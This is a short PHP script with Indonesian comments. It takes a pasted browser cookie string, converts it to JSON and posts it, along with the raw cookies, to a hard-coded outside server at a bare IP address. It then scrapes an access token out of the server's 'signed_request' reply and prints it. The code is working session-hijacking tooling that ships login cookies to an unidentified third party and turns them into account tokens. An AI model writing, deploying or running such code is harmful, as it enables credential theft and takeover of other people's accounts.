<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $cookieString = $_POST['cookies'];

    // Pisahkan cookie berdasarkan tanda ";"
    $cookieArray = explode(';', $cookieString);
    $result = [];

    // Iterasi setiap elemen dan pisahkan berdasarkan "="
    foreach ($cookieArray as $cookie) {
        $cookie = trim($cookie);
        if (!empty($cookie)) {
            list($key, $value) = explode('=', $cookie, 2);
            $result[$key] = $value;
        }
    }

    // Encode array menjadi JSON
    $cookies = json_encode($result, JSON_PRETTY_PRINT);

    // Menyiapkan data POST
    $data = [
        'cookies' => $cookies,
    ];

    // Inisialisasi sesi cURL
    $ch = curl_init();

    // Set URL tujuan untuk request POST
    curl_setopt($ch, CURLOPT_URL, "http://65.108.77.37:21686");

    // Set metode POST
    curl_setopt($ch, CURLOPT_POST, 1);

    // Set data POST (cookies)
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

    // Set header untuk menunjukkan bahwa request adalah form data
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded"
    ]);

    // Mengaktifkan respons untuk dikembalikan sebagai string
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Tambahkan cookie ke header
    curl_setopt($ch, CURLOPT_COOKIE, $cookieString);

    // Eksekusi request POST dan mendapatkan respons
    $response = curl_exec($ch);

    // Cek jika ada error
    if(curl_errno($ch)) {
        echo "Error: " . curl_error($ch);
    } else {
        // Memeriksa apakah respons valid dan mengandung data yang kita cari
        if ($response === false || empty($response)) {
            echo "Tidak ada respons yang diterima atau respons kosong.";
        } else {
            // Mengambil bagian yang mengandung "signed_reques" dalam respons
            if (preg_match('/<pre>\{(.*?)signed_request.*?\}/s', $response, $matches)) {
                // Mengambil token dari respons
                $a1 = explode('access_token\":\"', $matches[1]);
                $a2 = str_replace('', '', $a1);
                $a2 = explode('\",\"', $a2[1]);
                echo "" . htmlspecialchars($a2[0]); // Untuk menghindari masalah XSS
            } else {
                echo "Tidak ditemukan data yang sesuai dalam respons.";
            }
        }
    }

    // Menutup sesi cURL
    curl_close($ch);
}

?>
